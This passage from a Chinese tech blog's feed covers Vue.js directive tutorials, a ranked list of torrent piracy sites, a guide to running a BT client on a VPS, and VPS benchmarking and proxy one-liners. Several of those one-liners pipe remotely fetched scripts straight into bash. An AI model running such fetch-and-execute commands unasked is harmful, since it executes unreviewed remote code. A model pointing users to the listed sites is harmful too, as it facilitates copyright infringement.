class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-bind指令的作用是：为元素绑定属性"><a href="#v-bind指令的作用是：为元素绑定属性" class="headerlink" title="v-bind指令的作用是：为元素绑定属性"></a>v-bind指令的作用是：为元素绑定属性</h3><h3 id="完整的写法是-v-bind-属性名"><a href="#完整的写法是-v-bind-属性名" class="headerlink" title="完整的写法是 v-bind:属性名"></a>完整的写法是 <u><strong>v-bind:属性名</strong></u></h3><h3 id="简写的话可以直接省略v-bind，只保留-属性名"><a href="#简写的话可以直接省略v-bind，只保留-属性名" class="headerlink" title="简写的话可以直接省略v-bind，只保留 :属性名"></a>简写的话可以直接省略v-bind，只保留 <strong><u>:属性名</u></strong></h3><h3 id="需要动态的增删ckass建议使用对象的方式"><a href="#需要动态的增删ckass建议使用对象的方式" class="headerlink" title="需要动态的增删ckass建议使用对象的方式"></a>需要动态的增删ckass建议使用对象的方式</h3></blockquote><ul><li><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in arr&quot;</span>&gt;</span>第&#123;&#123;index+1&#125;&#125;个是&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>//跟for in里面的索引不同</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in arr1&quot;</span>&gt;</span>&#123;&#123;index&#125;&#125;今年&#123;&#123;item.name&#125;&#125;岁了<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">arr</span>:[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>],<span class="comment">//数组</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">arr1</span>:[&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;小明&quot;</span>:<span class="number">13</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;小绿&quot;</span>:<span class="number">15</span></span></span><br><span class="line"><span class="language-javascript">    &#125;]<span class="comment">//对象数组</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-for指令的作用是：根据数据生成列表结构"><a href="#v-for指令的作用是：根据数据生成列表结构" class="headerlink" title="v-for指令的作用是：根据数据生成列表结构"></a>v-for指令的作用是：根据数据生成列表结构</h3><h3 id="数组经常和v-for结合使用"><a href="#数组经常和v-for结合使用" class="headerlink" title="数组经常和v-for结合使用"></a>数组经常和v-for结合使用</h3><h3 id="语法是-item-index-in-数据"><a href="#语法是-item-index-in-数据" class="headerlink" title="语法是(item,index) in 数据"></a>语法是<strong><u>(item,index) in 数据</u></strong></h3><h3 id="item和index可以结合其他指令一起使用"><a href="#item和index可以结合其他指令一起使用" class="headerlink" title="item和index可以结合其他指令一起使用"></a>item和index可以结合其他指令一起使用</h3></blockquote><ul><li><h3 id="v-on补充"><a href="#v-on补充" class="headerlink" title="v-on补充"></a>v-on补充</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;lalala(1,2)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup:enter</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">lalala</span>: <span class="keyword">function</span>(<span class="params">p1,p2</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(p1);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(p2);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">test</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;test&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="事件绑定的方法写成函数调用的形式，可以传入自定义参数"><a href="#事件绑定的方法写成函数调用的形式，可以传入自定义参数" class="headerlink" title="事件绑定的方法写成函数调用的形式，可以传入自定义参数"></a>事件绑定的方法写成函数调用的形式，可以传入自定义参数</h3><h3 id="定义方法是需定义形参来接收传入的实参"><a href="#定义方法是需定义形参来接收传入的实参" class="headerlink" title="定义方法是需定义形参来接收传入的实参"></a>定义方法是需定义<strong><u>形参</u></strong>来接收传入的实参</h3><h3 id="事件的后面跟上-修饰符-可以对事件进行限制"><a href="#事件的后面跟上-修饰符-可以对事件进行限制" class="headerlink" title="事件的后面跟上 .修饰符 可以对事件进行限制"></a>事件的后面跟上 <strong><u>.修饰符</u></strong> 可以对事件进行限制</h3><h3 id="enter-可以限制触发的按键为回车"><a href="#enter-可以限制触发的按键为回车" class="headerlink" title=".enter 可以限制触发的按键为回车"></a><u><strong>.enter</strong></u> 可以限制触发的按键为回车</h3><h3 id="事件修饰符有很多种，具体更多详情请看文档-Https-cn-vuejs-org-v2-api-v-on"><a href="#事件修饰符有很多种，具体更多详情请看文档-Https-cn-vuejs-org-v2-api-v-on" class="headerlink" title="事件修饰符有很多种，具体更多详情请看文档 Https://cn.vuejs.org/v2/api/@v-on"></a>事件修饰符有很多种，具体更多详情请看文档 Https://cn.vuejs.org/v2/api/@v-on</h3></blockquote><ul><li><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">message</span>:<span class="string">&quot;nihaoa&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-model指令的作用是便捷的设置和获取表单元素的值"><a href="#v-model指令的作用是便捷的设置和获取表单元素的值" class="headerlink" title="v-model指令的作用是便捷的设置和获取表单元素的值"></a>v-model指令的作用是便捷的设置和获取表单元素的值</h3><h3 id="绑定的数据会和表单元素值相关联"><a href="#绑定的数据会和表单元素值相关联" class="headerlink" title="绑定的数据会和表单元素值相关联"></a>绑定的数据会和表单元素值相关联</h3><h3 id="绑定的数据⬅️➡️表单元素的值"><a href="#绑定的数据⬅️➡️表单元素的值" class="headerlink" title="绑定的数据⬅️➡️表单元素的值"></a>绑定的数据⬅️➡️表单元素的值</h3></blockquote>]]></content>
    
    
    <summary type="html">vue基本入门教程整理</summary>
    
    
    
    <category term="JavaScript" scheme="https://www.scery.com/categories/JavaScript/"/>
    
    <category term="Vue框架" scheme="https://www.scery.com/categories/JavaScript/Vue%E6%A1%86%E6%9E%B6/"/>
    
    <category term="入门" scheme="https://www.scery.com/categories/JavaScript/Vue%E6%A1%86%E6%9E%B6/%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="Program" scheme="https://www.scery.com/tags/Program/"/>
    
    <category term="Vue框架" scheme="https://www.scery.com/tags/Vue%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>Top_BTWebsite</title>
    <link href="https://www.scery.com/Top-BTWebsite.htm"/>
    <id>https://www.scery.com/Top-BTWebsite.htm</id>
    <published>2020-05-24T13:43:14.000Z</published>
    <updated>2024-03-18T02:51:00.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、海盗湾"><a href="#1、海盗湾" class="headerlink" title="1、海盗湾"></a>1、海盗湾</h2><p>网址：<a href="https://thepiratebay.org/">https://thepiratebay.org/</a></p><p>海盗湾建站至今超过 16 年，仍在继续运营。在经历了 2018 年的严重停机事故之后，去年表现相对平稳。该网站几个月前关闭了新用户注册，但仍向公众开放。它仍在使用 .org 域名，但不确定将来是否会如此。</p><h2 id="2、YTS-lt"><a href="#2、YTS-lt" class="headerlink" title="2、YTS.lt"></a>2、YTS.lt</h2><p>网址: <a href="https://yts.lt/">https://yts.lt/</a></p><p>这个网站是原 YTS/YIFY 的非官方继任者。该网站侧重于全球热门的电影发布。YTS 最近成为美国三起诉讼的被告，虽然运营商签署同意了判决，向一名电影制作人支付损害赔偿金，但该网站仍处于在线状态。</p><h2 id="3、1337X"><a href="#3、1337X" class="headerlink" title="3、1337X"></a>3、1337X</h2><p>网址：<a href="https://1337x.to/">https://1337x.to/</a></p><p>1337X 保住了前三的位子，与其他一些网站不同的是，它有一群忠实的 up 主，每天都会提供新种子。</p><h2 id="4、RARBG"><a href="#4、RARBG" class="headerlink" title="4、RARBG"></a>4、RARBG</h2><p>网址：<a href="https://rarbg.to/">https://rarbg.to/</a></p><p>在过去的一年里，RARBG 一直保持稳定运营。RARBG 成立于 2008 年，该站在高清电影和电视剧方面更新速度较快。该站有多个域名，这里选取访问量最大的域名进行排名。</p><h2 id="5、NYAA-si"><a href="#5、NYAA-si" class="headerlink" title="5、NYAA.si"></a>5、NYAA.si</h2><p>网址：<a href="https://nyaa.si/">https://nyaa.si/</a></p><p>NYAA.si 是知名动漫 BT 站 NYAA 关站重生后的网站。虽然有来自其他 BT 站的激烈竞争，但 NYAA 表现良好，与去年排名相比上升了一位。</p><h2 id="6、Torrentz2"><a href="#6、Torrentz2" class="headerlink" title="6、Torrentz2"></a>6、Torrentz2</h2><p>网址：<a href="https://torrentz2.eu/">https://torrentz2.eu/</a></p><p>Torrentz2 是 Torrentz.eu 的替代网站，Torrentz.eu 网站于 2016 年自愿关闭。该网站没有存储任何种子文件，但仍然是一个很受欢迎的种子搜索引擎。</p><h2 id="7、EZTV-io"><a href="#7、EZTV-io" class="headerlink" title="7、EZTV.io"></a>7、EZTV.io</h2><p>网址：<a href="https://eztv.io/">https://eztv.io/</a></p><p>最初的电视剧发布组 EZTV 在 2015 年被恶意收购后关站，新所有者声称拥有该品牌。该组织去年改用了一个新域名，由于与海盗湾（Pirate Bay）共用了 IP 地址，因此无意中被荷兰封锁屏蔽。</p><h2 id="8、LimeTorrents"><a href="#8、LimeTorrents" class="headerlink" title="8、LimeTorrents"></a>8、LimeTorrents</h2><p>网址：<a href="https://www.limetorrents.info/">https://www.limetorrents.info/</a></p><p>LimeTorrents 已经有十多年的历史了。跟这个榜单中的其他网站一样，被世界各地的 ISP 封锁，在一定程度上影响了整体访问流量。</p><h2 id="9、Fitgirl-Repacks"><a href="#9、Fitgirl-Repacks" class="headerlink" title="9、Fitgirl Repacks"></a>9、Fitgirl Repacks</h2><p>网址：<a href="https://fitgirl-repacks.site/">https://fitgirl-repacks.site/</a></p><p>FitGirl Repacks 绝不是一个传统的 BT 站。它是一个游戏发布组的网站，它发布热门游戏的精简破解版，从而将下载时间降至最低。他们在其他网站上发布种子，但也提供他们自己的磁力链接，这就是为什么我们在这里加入这个网站的原因。</p><h2 id="10、Tamil-Rockers"><a href="#10、Tamil-Rockers" class="headerlink" title="10、Tamil Rockers"></a>10、Tamil Rockers</h2><p>网址：<a href="https://tamilrockers.ws/">https://tamilrockers.ws/</a></p><p>TamilRockers 在印度非常出名，并设有基地。由于它有英文版本，该网站在全球范围内都有使用。尽管印度发起过几次执法行动，并逮捕了涉嫌的管理员和操作员，但该网站仍在蓬勃发展。</p>]]></content>
    
    
    <summary type="html">主流BT网站推荐</summary>
    
    
    
    <category term="BT" scheme="https://www.scery.com/categories/BT/"/>
    
    <category term="Download" scheme="https://www.scery.com/categories/BT/Download/"/>
    
    <category term="movies" scheme="https://www.scery.com/categories/BT/Download/movies/"/>
    
    
    <category term="Download" scheme="https://www.scery.com/tags/Download/"/>
    
    <category term="BT" scheme="https://www.scery.com/tags/BT/"/>
    
  </entry>
  
  <entry>
    <title>vps_BTdownload</title>
    <link href="https://www.scery.com/vps-BTdownload.htm"/>
    <id>https://www.scery.com/vps-BTdownload.htm</id>
    <published>2020-05-24T13:41:33.000Z</published>
    <updated>2024-03-18T02:51:00.823Z</updated>
    
    <content type="html"><![CDATA[<p>在vps的选取上应该注意以下几点：</p><ol><li>硬盘足够大，如果你选个只有5G硬盘大小的vps，估计你也下不了什么；</li><li><strong>vps提供商允许bt</strong> ，这点很重要，部分国家对版权问题零容忍。在购买vps前一定要仔细看看TOS,看是否允许BT下载；</li></ol><p>例如ramnode的 <code>Acceptable Use Policy</code> 中有写有：</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">The following are acceptable uses provided they comply with the rest of this AUP:</span><br><span class="line"><span class="comment">* IRC*</span></span><br><span class="line"><span class="comment">* Source games+</span></span><br><span class="line"><span class="comment">* Minecraft servers+</span></span><br><span class="line"><span class="comment">* VPN</span></span><br><span class="line"><span class="comment">* Adult material</span></span><br><span class="line"><span class="comment">* Video streaming</span></span><br><span class="line"><span class="comment">* Torrents (Only allowed in US locations - must be limited to 20Mbps total)</span></span><br><span class="line"><span class="comment">* Usenet (Must be limited to 20Mbps total)</span></span><br><span class="line"><span class="comment">*Any usage which results in any attacks against RamNode the company (not just the client’s VPS) may result in suspension and/or termination.</span></span><br><span class="line">+Game servers are <span class="keyword">not</span> allowed on Massive plans (CVZ <span class="keyword">and</span> CKVM).</span><br></pre></td></tr></table></figure><p>倒数第二条，写道： <code>在美国的vps允许限速20M的Torrents</code></p><h3 id="2-BT软件安装"><a href="#2-BT软件安装" class="headerlink" title="2.BT软件安装"></a>2.BT软件安装</h3><p>BT客户端为 <code>deluge</code> ，deluge提供了 <strong>web-ui</strong> 管理，方便管理操作</p><p>ubuntu上使用PPA的方式安装:</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:deluge-team/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install deluge deluge-web</span><br></pre></td></tr></table></figure><p>其他 <a href="http://www.codercto.com/category/linux.html">linux</a> 发行版本的安装方式可以参考 <a href="http://dev.deluge-torrent.org/wiki/Download">官方文档</a></p><p>安装完成后通过启动 <code>deluge</code> ：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">deluge-web <span class="attr">--ssl</span> -<span class="selector-tag">p</span> <span class="number">8080</span> &amp;</span><br></pre></td></tr></table></figure><p>这里 <code>--ssl</code> 指开启ssl访问， <code>8080</code> 是指访问端口，这时只需要访问 <code>https://ip:8080</code> 就可以看到 <code>deluge</code> 的web管理界面了，deluge的 <strong>默认密码</strong> 为 <code>deluge</code> ，进入后记得 <strong>及时修改密码</strong></p><p>然后连接deluge服务:</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/FJVjInI.png!web" alt="利用vps搭建BT离线下载"></p><p>到这里BT服务端基本就搭建完毕了， <strong>记得给deluge的上传和下载限速20M</strong></p>]]></content>
    
    
    <summary type="html">vps BT下载服务端</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="BT Download Server" scheme="https://www.scery.com/categories/Linux/BT-Download-Server/"/>
    
    <category term="build" scheme="https://www.scery.com/categories/Linux/BT-Download-Server/build/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="BT Download Server" scheme="https://www.scery.com/tags/BT-Download-Server/"/>
    
  </entry>
  
  <entry>
    <title>proxyvps_tool</title>
    <link href="https://www.scery.com/proxyvps-tool.htm"/>
    <id>https://www.scery.com/proxyvps-tool.htm</id>
    <published>2020-05-12T03:12:19.000Z</published>
    <updated>2024-03-18T02:51:00.823Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget git.io/vpstest &amp;&amp; bash vpstest</span><br><span class="line">wget -qO- --no-check-certificate https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/oooldking/</span>script<span class="regexp">/master/</span>superbench.sh | bash</span><br><span class="line">wget -qO- sb.oldking.net | bash</span><br><span class="line">wget -qO- bench.sh | bash</span><br><span class="line"><span class="regexp">//</span>到国内的速度</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">wget <span class="string">&quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.<span class="keyword">sh</span> &amp;&amp; ./tcp.<span class="keyword">sh</span></span><br><span class="line"><span class="comment">//BBR锐速三合一脚本</span></span><br></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget -qO- git.io/besttrace <span class="string">| bash</span></span><br><span class="line"><span class="comment">//traceroute回程</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -O speedtest-cli https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/sivel/</span>speedtest-cli<span class="regexp">/master/</span>speedtest.py</span><br><span class="line">chmod +x speedtest-cli</span><br><span class="line"><span class="regexp">//</span>speedtest</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -s -L https:<span class="comment">//git.io/v2ray.sh)</span></span><br><span class="line">forever stop <span class="selector-tag">main</span><span class="selector-class">.js</span></span><br><span class="line">rm -rf <span class="selector-tag">main</span><span class="selector-class">.js</span></span><br><span class="line">forever start anthonysclientmain<span class="selector-class">.js</span></span><br><span class="line"><span class="comment">//V2</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for centos</span></span><br><span class="line">bash &lt;(curl -Ls https:<span class="regexp">//gi</span>thub.com<span class="regexp">/mzz2017/</span>lkl-haproxy<span class="regexp">/raw/m</span>aster/lkl-haproxy-centos-nocheckvirt.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for debian</span></span><br><span class="line">bash &lt;(curl -Ls https:<span class="regexp">//gi</span>thub.com<span class="regexp">/mzz2017/</span>lkl-haproxy<span class="regexp">/raw/m</span>aster/lkl-haproxy-debian-nocheckvirt.sh)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>openvz bbr</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget -U <span class="string">&quot;wocaonima&quot;</span> https://<span class="keyword">file</span>.scery.<span class="keyword">com</span>/nginx.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> nginx.<span class="keyword">sh</span> &amp;&amp; ./nginx.<span class="keyword">sh</span></span><br><span class="line">wget -U <span class="string">&quot;wocaonima&quot;</span> https://<span class="keyword">file</span>.scery.<span class="keyword">com</span>/installpanelcilent.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> installpanelcilent.<span class="keyword">sh</span> &amp;&amp; ./installpanelcilent.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">vps测试工具</summary>
    
    
    
    <category term="vps" scheme="https://www.scery.com/categories/vps/"/>
    
    <category term="proxy" scheme="https://www.scery.com/categories/vps/proxy/"/>
    
    <category term="shell" scheme="https://www.scery.com/categories/vps/proxy/shell/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="ops" scheme="https://www.scery.com/tags/ops/"/>
    
    <category term="proxy" scheme="https://www.scery.com/tags/proxy/"/>
    
    <category term="fasttest" scheme="https://www.scery.com/tags/fasttest/"/>
    
  </entry>
  
  <entry>
    <title>javascript-gather</title>
    <link href="https://www.scery.com/javascript-gather.htm"/>
    <id>https://www.scery.com/javascript-gather.htm</id>
    <published>2020-05-09T14:23:00.000Z</published>
    <updated>2024-03-18T02:51:00.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h4 id="集合是什么？"><a href="#集合是什么？" class="headerlink" title="集合是什么？"></a>集合是什么？</h4><ul><li>集合有三个特点<pre><code>- 无重复性 -不能重复key,每个元素都唯一- 空集 - &#123;&#125;- 子集</code></pre></li></ul><p>Object.prototype.xxxx</p><p>Object是一个大写开头的，就是一个构造器，也就是一个函数，也是对象的一种，也有自己的属性和方法，他可以继承给自己的子类</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509223633857.png" alt="image-20200509223633857"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509223929866.png" alt="image-20200509223929866"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509224443594.png" alt="image-20200509224443594"></p>]]></content>
    
    
    <summary type="html">js的数据结构六:集合</summary>
    
    
    
    <category term="代码" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="集合" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E9%9B%86%E5%90%88/"/>
    
    
    <category term="代码" scheme="https://www.scery.com/tags/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/tags/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="集合" scheme="https://www.scery.com/tags/%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>javascript-circular-linkedlist</title>
    <link href="https://www.scery.com/javascript-circular-linkedlist.htm"/>
    <id>https://www.scery.com/javascript-circular-linkedlist.htm</id>
    <published>2020-05-09T14:22:38.000Z</published>
    <updated>2024-03-18T02:51:00.796Z</updated>
    
    
    <summary type="html">js的数据结构五:循环链表</summary>
    
    
    
    <category term="代码" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="循环链表" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/"/>
    
    
    <category term="代码" scheme="https://www.scery.com/tags/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/tags/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="循环链表" scheme="https://www.scery.com/tags/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
</feed>
